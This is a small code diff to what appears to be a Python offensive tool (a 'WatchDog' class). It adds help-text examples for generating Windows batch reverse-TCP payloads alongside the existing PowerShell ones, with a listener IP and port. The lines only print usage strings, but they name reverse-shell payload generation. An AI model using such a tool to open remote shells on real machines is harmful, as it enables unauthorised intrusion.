@@ -6,7 +6,6 @@ import threading
 
 colorama.init()
 
-
 class WatchDog:
     def __init__(self):
         self.running = True
@@ -181,6 +180,8 @@ class WatchDog:
                 print("")
                 print("<Example> generate payload=windows/powershell/reverse_tcp lhost=192.168.10.1 lport=5050")
                 print("<Example> generate payload=windows/powershell/reverse_tcp lport=5050")
+                print("<Example> generate payload=windows/batch/reverse_tcp lhost=192.168.10.1 lport=5050")
+                print("<Example> generate payload=windows/batch/reverse_tcp lport=5050")
                 print("")
                 print("")
                 print("")
